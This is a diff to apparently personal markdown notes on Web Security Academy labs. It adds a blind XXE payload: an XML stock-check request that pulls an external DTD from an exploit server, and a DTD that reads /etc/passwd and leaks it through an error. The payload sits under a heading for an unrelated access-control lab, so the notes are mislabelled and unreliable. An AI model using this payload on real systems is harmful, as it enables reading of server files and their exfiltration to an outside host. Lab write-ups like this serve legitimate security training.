@@ -387,7 +387,28 @@ Requires Burp Suite Professional.
 Unprotected admin functionality: robots.txt
 Unprotected admin functionality with unpredictable URL: view source => js to check admin => /admin-uhsegl
 User role controlled by request paramter: login as wiener/peter => go to /admin
-User role can be modified in user profile: 
+```
+
+#### User role can be modified in user profile
+
+In the POST request:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE message [ <!ENTITY % ext SYSTEM "https://ac6b1f171eb283ab806aab0c014d0068.web-security-academy.net/exploit"> %ext; ]>
+<stockCheck>
+<productId></productId>
+<storeId></storeId>
+</stockCheck>
+```
+
+On the exploit server:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
 ```
 
 #### URL-based access control can be circumvented
